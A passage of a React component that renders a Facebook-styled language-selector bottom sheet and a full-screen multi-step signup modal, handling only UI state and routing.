            onSignUpSuccess={(data) => {
              signup(data);
              setAuthMode('accounts');
              setRoute('home');
            }}
          />
        )}
      </div>

      {/* Language Selector Bottom Sheet (Drawer) */}
      {showLanguageSheet && (
        <div
          className="fb-lang-sheet-backdrop"
          onClick={() => setShowLanguageSheet(false)}
        >
          <div
            className="fb-lang-sheet-container"
            onClick={(e) => e.stopPropagation()}
          >
            <div className="fb-lang-sheet-handle" />

            <div className="fb-lang-sheet-header">
              <button
                type="button"
                className="fb-lang-sheet-close-btn"
                onClick={() => setShowLanguageSheet(false)}
                title="Close"
                aria-label="Close"
              >
                <X size={24} color="#050505" strokeWidth={2.4} />
              </button>
            </div>

            <h2 className="fb-lang-sheet-title">Select your language</h2>

            <div className="fb-lang-sheet-scroll-wrap">
              <div className="fb-lang-sheet-box">
                {languages.map((lang) => {
                  const isSelected = selectedLanguage === lang.name;
                  return (
                    <div
                      key={lang.id}
                      className={`fb-lang-sheet-row ${isSelected ? 'selected' : ''}`}
                      onClick={() => {
                        setSelectedLanguage(lang.name);
                        setTimeout(() => setShowLanguageSheet(false), 240);
                      }}
                    >
                      <span className="fb-lang-name">{lang.name}</span>

                      <div className={`fb-lang-checkbox ${isSelected ? 'checked' : ''}`}>
                        {isSelected && (
                          <Check size={14} color="#FFFFFF" strokeWidth={3.5} />
                        )}
                      </div>
                    </div>
                  );
                })}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Facebook Multi-Step Sign Up Flow */}
      {showSignupModal && (
        <div style={{ position: 'fixed', inset: 0, zIndex: 10000, backgroundColor: '#FFFFFF' }}>
          <SignUpFlow
            onBackToLogin={() => setShowSignupModal(false)}
            onGoToFindAccount={() => {
              setShowSignupModal(false);
              setDesktopMode('forgot');
            }}
            onSignUpSuccess={(data) => {
              signup(data);
              setShowSignupModal(false);
            }}
          />
        </div>
      )}
    </div>
  );
}
